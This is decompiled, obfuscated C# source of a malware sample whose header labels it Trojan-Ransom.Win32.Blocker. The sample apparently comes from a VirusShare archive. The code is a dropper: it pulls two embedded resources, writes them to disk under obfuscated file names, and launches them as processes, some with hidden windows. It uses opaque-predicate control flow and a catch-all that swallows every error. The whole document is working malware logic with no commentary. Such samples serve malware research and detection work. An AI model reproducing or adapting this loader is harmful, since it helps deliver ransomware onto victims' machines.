// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Loader.installer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=5afe7557eabdd922
// MVID: 60E69C82-3262-4EB0-AE17-CA746ABA1DFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.mfa-066a8b95598361161e98b8e646e296c6d99174a08f1217945906b9bb95c02611.exe

using \u0002;
using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0002
{
  internal sealed class \u0002
  {
    public static FileStream \u0001;
    public static FileStream \u0002;

    [DllImport("kernel32.dll", EntryPoint = "FreeConsole")]
    public static extern bool \u0001();

    private static unsafe void \u0001([In] string[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(6);
      try
      {
        if (true)
          MemoryManager.\u0001();
        \u0002.\u0002.\u0001();
        *(sbyte*) voidPtr = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 2) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 3) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 0;
        Stream stream1 = global::\u0002.\u007E\u0002((object) \u0001.\u0001(), \u0003.\u0001(1));
        byte[] numArray1 = new byte[\u0003.\u007E\u0003((object) stream1)];
        int num1 = \u0004.\u007E\u0005((object) stream1, numArray1, 0, numArray1.Length);
        Process process1;
        if (true)
        {
          \u0005.\u007E\u0006((object) stream1);
          Stream stream2 = global::\u0002.\u007E\u0002((object) \u0001.\u0001(), \u0003.\u0001(12));
          byte[] numArray2 = new byte[\u0003.\u007E\u0003((object) stream2)];
          int num2 = \u0004.\u007E\u0005((object) stream2, numArray2, 0, numArray2.Length);
          if (true)
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 1) != (sbyte) 0)
            {
              \u0002.\u0002.\u0001 = new FileStream(\u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(32)), FileMode.Create);
              goto label_12;
            }
            else if (*(sbyte*) ((IntPtr) voidPtr + 2) == (sbyte) 0)
            {
              \u0002.\u0002.\u0001 = new FileStream(\u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(58)), FileMode.Create);
              goto label_12;
            }
          }
          else
            goto label_7;
label_6:
          num2 = 5;
label_7:
          switch (num2)
          {
            case 0:
              goto label_6;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0002.\u0002.\u0001);
              }
              \u0002.\u0002.\u0001 = new FileStream(\u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(45)), FileMode.Create);
              break;
          }
label_12:
          \u0008.\u007E\u0012((object) \u0002.\u0002.\u0001, numArray1, 0, numArray1.Length);
          \u0005.\u007E\u0006((object) \u0002.\u0002.\u0001);
          \u0005.\u007E\u0007((object) \u0002.\u0002.\u0001);
          if (*(sbyte*) ((IntPtr) voidPtr + 3) != (sbyte) 0)
          {
label_13:
            switch (5)
            {
              case 0:
                goto label_13;
              default:
                \u0002.\u0002.\u0002 = new FileStream(\u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(71)), FileMode.Create);
                break;
            }
          }
          else
            \u0002.\u0002.\u0002 = new FileStream(\u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(84)), FileMode.Create);
          \u0008.\u007E\u0012((object) \u0002.\u0002.\u0002, numArray2, 0, numArray2.Length);
          \u0005.\u007E\u0006((object) \u0002.\u0002.\u0002);
          \u0005.\u007E\u0007((object) \u0002.\u0002.\u0002);
          process1 = new Process();
          if (*(sbyte*) ((IntPtr) voidPtr + 1) == (sbyte) 0)
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 2) != (sbyte) 0)
            {
label_21:
              switch (2)
              {
                case 0:
                  goto label_21;
                default:
                  \u000F.\u007E\u0014((object) \u000E.\u007E\u0013((object) process1), \u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(45)));
                  goto label_24;
              }
            }
            else
            {
              \u000F.\u007E\u0014((object) \u000E.\u007E\u0013((object) process1), \u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(58)));
              goto label_24;
            }
          }
        }
        else
          goto label_18;
label_17:
        num1 = 6;
label_18:
        switch (num1)
        {
          case 0:
            goto label_17;
          default:
            \u000F.\u007E\u0014((object) \u000E.\u007E\u0013((object) process1), \u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(32)));
            break;
        }
label_24:
        if (*(sbyte*) ((IntPtr) voidPtr + 5) != (sbyte) 0)
        {
label_25:
          switch (5)
          {
            case 0:
              goto label_25;
            default:
              \u0010.\u007E\u0015((object) \u000E.\u007E\u0013((object) process1), ProcessWindowStyle.Hidden);
              break;
          }
        }
        int num3 = \u0011.\u007E\u0016((object) process1) ? 1 : 0;
        if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
        {
label_28:
          switch (7)
          {
            case 0:
              goto label_28;
            default:
              \u0005.\u007E\u0008((object) process1);
              break;
          }
        }
        Process process2 = new Process();
        if (*(sbyte*) ((IntPtr) voidPtr + 3) != (sbyte) 0)
        {
label_31:
          switch (4)
          {
            case 0:
              goto label_31;
            default:
              \u000F.\u007E\u0014((object) \u000E.\u007E\u0013((object) process2), \u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(71)));
              break;
          }
        }
        else
          \u000F.\u007E\u0014((object) \u000E.\u007E\u0013((object) process2), \u0007.\u0011(\u0006.\u000F(\u0003.\u0001(23)), \u0003.\u0001(84)));
        if (*(sbyte*) voidPtr != (sbyte) 0)
        {
label_35:
          switch (2)
          {
            case 0:
              goto label_35;
            default:
              \u0010.\u007E\u0015((object) \u000E.\u007E\u0013((object) process2), ProcessWindowStyle.Hidden);
              break;
          }
        }
        int num4 = \u0011.\u007E\u0016((object) process2) ? 1 : 0;
      }
      catch
      {
      }
    }
  }
}
